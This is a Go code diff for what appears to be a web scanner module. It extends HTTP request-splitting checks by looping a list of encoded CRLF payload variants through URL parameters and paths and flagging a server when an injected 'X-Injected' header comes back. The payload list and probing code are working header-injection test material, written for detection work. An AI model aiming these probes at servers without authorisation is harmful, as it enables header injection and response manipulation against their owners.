@@ -24,6 +24,9 @@ func RequestSplitting(result *common.ServerResult) {
 
 }
 
+var payloads = []string{"%0d%0a", "%25%0a", "%25250a", "%%0a0a", "%3f%0d",
+	"%23%0d", "%25%30a", "%25%30%61", "%u000a"}
+
 // This function tests for HTTP Request Splitting by injecting a CRLF sequence in the parameters
 func paramSplitTest(result *common.ServerResult) {
 	var params []string
@@ -71,45 +74,48 @@ func paramSplitTest(result *common.ServerResult) {
 	}
 
 	for _, param := range controllable {
-		queryParams := parsedURL.Query()
-		if err != nil {
-			logger.Debugf("Error generating signature: %v\n", err)
-			return
-		}
-		payload := "whatATest%0d%0aX-Injected:%20whatANiceDay%0d%0a"
-		queryParams.Set(param, payload)
+		for _, pay := range payloads {
+			queryParams := parsedURL.Query()
+			if err != nil {
+				logger.Debugf("Error generating signature: %v\n", err)
+				return
+			}
 
-		//had to make sure all other parameters are included and properly encoded in the URL
-		rawQuery := ""
-		for key, values := range queryParams {
-			for _, value := range values {
-				if rawQuery != "" {
-					rawQuery += "&"
-				}
-				if key != param {
-					rawQuery += key + "=" + url.QueryEscape(value)
-				} else {
-					rawQuery += key + "=" + value
+			payload := fmt.Sprintf("whatATest%sX-Injected:%%20whatANiceDay%s", pay, pay)
+			queryParams.Set(param, payload)
+
+			//had to make sure all other parameters are included and properly encoded in the URL
+			rawQuery := ""
+			for key, values := range queryParams {
+				for _, value := range values {
+					if rawQuery != "" {
+						rawQuery += "&"
+					}
+					if key != param {
+						rawQuery += key + "=" + url.QueryEscape(value)
+					} else {
+						rawQuery += key + "=" + value
+					}
 				}
 			}
-		}
-		parsedURL.RawQuery = rawQuery
+			parsedURL.RawQuery = rawQuery
 
-		req, err := http.NewRequest("GET", parsedURL.String(), nil)
-		if err != nil {
-			logger.Debugf("Error creating request: %v", err)
-			continue
-		}
-		resp, err := checker.CheckServerCustom(req, clients.NoRedirecth1Client)
-		if err != nil {
-			logger.Debugf("Error getting response from %s: %v\n", parsedURL.String(), err)
-			continue
-		}
-		logger.Debugf("[Param Split] Testing for HTTP Request Splitting: %s on param %s\n", result.Url, param)
-		if matcher.HeaderKeyContainsSignature(resp, "X-Injected") {
-			msg := fmt.Sprintf("[Param Split] Vulnerable to HTTP Request Splitting: %s on param %s\n", result.Url, param)
-			logger.Infof(msg)
-			common.OutputP.PublishMessage(msg)
+			req, err := http.NewRequest("GET", parsedURL.String(), nil)
+			if err != nil {
+				logger.Debugf("Error creating request: %v", err)
+				continue
+			}
+			resp, err := checker.CheckServerCustom(req, clients.NoRedirecth1Client)
+			if err != nil {
+				logger.Debugf("Error getting response from %s: %v\n", parsedURL.String(), err)
+				continue
+			}
+			logger.Debugf("[Param Split] Testing for HTTP Request Splitting: %s on param %s\n", result.Url, param)
+			if matcher.HeaderKeyContainsSignature(resp, "X-Injected") {
+				msg := fmt.Sprintf("[Param Split] Vulnerable to HTTP Request Splitting: %s\n", parsedURL.String())
+				logger.Infof(msg)
+				common.OutputP.PublishMessage(msg)
+			}
 		}
 
 	}
@@ -140,23 +146,24 @@ func pathSplitTest(result *common.ServerResult) {
 		return
 	}
 
-	path := "%0d%0aX-Injected:%20whatANiceDay%0d%0a"
-	payloadUrl := fmt.Sprintf("http://%s/%s", parsedUrl.Host, path)
-	req, err := http.NewRequest("GET", payloadUrl, nil)
-	if err != nil {
-		logger.Errorf("Error creating request: %v", err)
-		return
+	for _, payload := range payloads {
+		path := fmt.Sprintf("%sX-Injected:%%20whatANiceDay%s", payload, payload)
+		payloadUrl := fmt.Sprintf("http://%s/%s", parsedUrl.Host, path)
+		req, err := http.NewRequest("GET", payloadUrl, nil)
+		if err != nil {
+			logger.Errorf("Error creating request: %v", err)
+			return
+		}
+		resp, err := checker.CheckServerCustom(req, clients.NoRedirecth1Client)
+		if err != nil {
+			logger.Debugf("Error getting response from %s: %v\n", payloadUrl, err)
+			return
+		}
+		logger.Debugf("[Path Split] Testing for HTTP Request Splitting: %s\n", result.Url)
+		if matcher.HeaderKeyContainsSignature(resp, "X-Injected") {
+			msg := fmt.Sprintf("[Path Split] Vulnerable to HTTP Request Splitting: %s\n", payloadUrl)
+			logger.Infof(msg)
+			common.OutputP.PublishMessage(msg)
+		}
 	}
-	resp, err := checker.CheckServerCustom(req, clients.NoRedirecth1Client)
-	if err != nil {
-		logger.Debugf("Error getting response from %s: %v\n", payloadUrl, err)
-		return
-	}
-	logger.Debugf("[Path Split] Testing for HTTP Request Splitting: %s\n", result.Url)
-	if matcher.HeaderKeyContainsSignature(resp, "X-Injected") {
-		msg := fmt.Sprintf("[Path Split] Vulnerable to HTTP Request Splitting: %s\n", result.Url)
-		logger.Infof(msg)
-		common.OutputP.PublishMessage(msg)
-	}
-
 }
